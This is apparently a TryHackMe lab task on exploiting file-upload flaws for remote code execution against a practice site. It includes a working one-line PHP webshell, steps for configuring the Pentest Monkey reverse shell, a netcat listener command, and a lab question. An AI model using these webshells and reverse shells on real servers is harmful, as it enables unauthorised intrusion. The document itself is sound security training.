
It's all well and good overwriting files that exist on the server. That's a nuisance to the person maintaining the site, and may lead to some vulnerabilities, but let's go further; let's go for RCE!

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server. Whilst this is likely to be as a low\-privileged web user account (such as `www-data` on Linux servers), it's still an extremely serious vulnerability. Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back\-end of the website (or another language which the server understands and will execute). Traditionally this would be PHP, however, in more recent times, other back\-end languages have become more common (Python Django and Javascript in the form of Node.js being prime examples). It's worth noting that in a *routed* application (i.e. an application where the routes are defined programmatically rather than being mapped to the file\-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.

There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network\-based shells). We'll take a look at each of these in turn. As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it (non\-routed applications with inadequate restrictions), or by otherwise forcing the webapp to run the script for us (necessary in routed applications).

---

*Web shells:*

Let's assume that we've found a webpage with an upload form:

![](https://i.imgur.com/GxMJAKH.png)

Where do we go from here? Well, let's start with a gobuster scan:![](https://i.imgur.com/OftwAIE.png)

Looks like we've got two directories here \-\- `uploads` and `assets`. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:

![](https://i.imgur.com/aAyIrod.png)

![](https://i.imgur.com/mIbGRIk.png)

Now, if we go to `http://demo.uploadvulns.thm/uploads` we should see that the spaniel picture has been uploaded!

![](https://i.imgur.com/lVe2tjL.png)

![](https://i.imgur.com/N8vWlVO.png)

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back\-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.

A simple webshell works by taking a parameter and executing it as a system command. In PHP, the syntax for this would be:

`<?php
    echo system($_GET["cmd"]);
?>`

This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:

![](https://i.imgur.com/CU0Uyx5.png)

Success!

We could now use this shell to read files from the system, or upgrade from here to a reverse shell. Now that we have RCE, the options are limitless. Note that when using webshells, it's usually easier to view the output by looking at the source code of the page. This drastically improves the formatting of the output.

---

*Reverse Shells:*

The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali Linux, but can also be downloaded [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). You will need to edit line 49 of the shell. It will currently say `$ip = '127.0.0.1';  // CHANGE THIS
` \-\- as it instructs, change `127.0.0.1` to your TryHackMe tun0 IP address, which can be found on the [access page](https://tryhackme.com/access). You can ignore the following line, which also asks to be changed. With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection. `nc -lvnp 1234`:

![](https://i.imgur.com/ysY306E.png)

Now, let's upload the shell, then activate it by navigating to `http://demo.uploadvulns.thm/uploads/shell.php`. The name of the shell will obviously be whatever you called it (`php-reverse-shell.php` by default).

The website should hang and not load properly \-\- however, if we switch back to our terminal, we have a hit!

![](https://i.imgur.com/he0hbiR.png)

Once again, we have obtained RCE on this webserver. From here we would want to stabilise our shell and escalate our privileges, but those are tasks for another time. For now, it's time you tried this for yourself!

---

Navigate to `shell.uploadvulns.thm` and complete the questions for this task.

Answer the questions below

Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?

*(N.B. This is a good habit to get into, and will serve you well in the upcoming tasks...)*